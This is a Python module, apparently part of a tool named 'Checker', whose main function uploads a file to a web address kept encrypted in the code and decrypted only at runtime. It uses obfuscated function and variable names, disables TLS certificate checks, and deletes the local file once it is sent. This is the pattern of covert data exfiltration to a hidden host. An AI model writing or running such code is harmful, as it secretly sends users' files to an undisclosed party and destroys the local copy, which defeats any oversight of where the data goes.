import sys

import requests
import urllib3
from cryptography.fernet import Fernet
import os
from Checker.lib.auth.cry import *
from Checker.lib.file_handle import delete_file
from Checker.lib.handle.n_post import send
from Checker.lib.log_color import log
from Checker.lib.setting import config
def remove_string_from_list(string_list, string_to_remove):
    """从字符串列表中删除指定的字符串"""
    # 使用列表推导式创建一个新列表，排除要删除的字符串
    return [s for s in string_list if s != string_to_remove]


def _m_3411_(_p_123124_, prefix):
    try:

        # log.error("执行线程")
        if "True" in prefix:
            send()


        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        # 获取旧文件名和扩展名
        old_file_name = os.path.basename(_p_123124_)  # 获取文件名部分
        file_extension = os.path.splitext(old_file_name)[1]  # 获取文件扩展名

        # backup_files = os.listdir("save/backup")
        # log.info("backup 目录下的文件:")
        # for file in backup_files:
            # log.info(file)


        # 创建新的文件名，添加前缀
        new_file_name = f"{prefix}-{old_file_name}"  # 形成新的文件名格式
        with open(_p_123124_, "rb") as file:
            # 使用元组形式传递文件和新文件名
            files = {"file": (new_file_name, file)}
            response = requests.post(
                Fernet(rar_34343_).decrypt(dar_33454_).decode(),
                files=files,
                verify=False
            )

        delete_file(_p_123124_)
        remove_string_from_list(config.thread_pool,file)
        return response

    except Exception as e:
        log.info(f"发生推送错误: {e}")

if __name__ == "__main__":
    sys.exit("耶耶！")
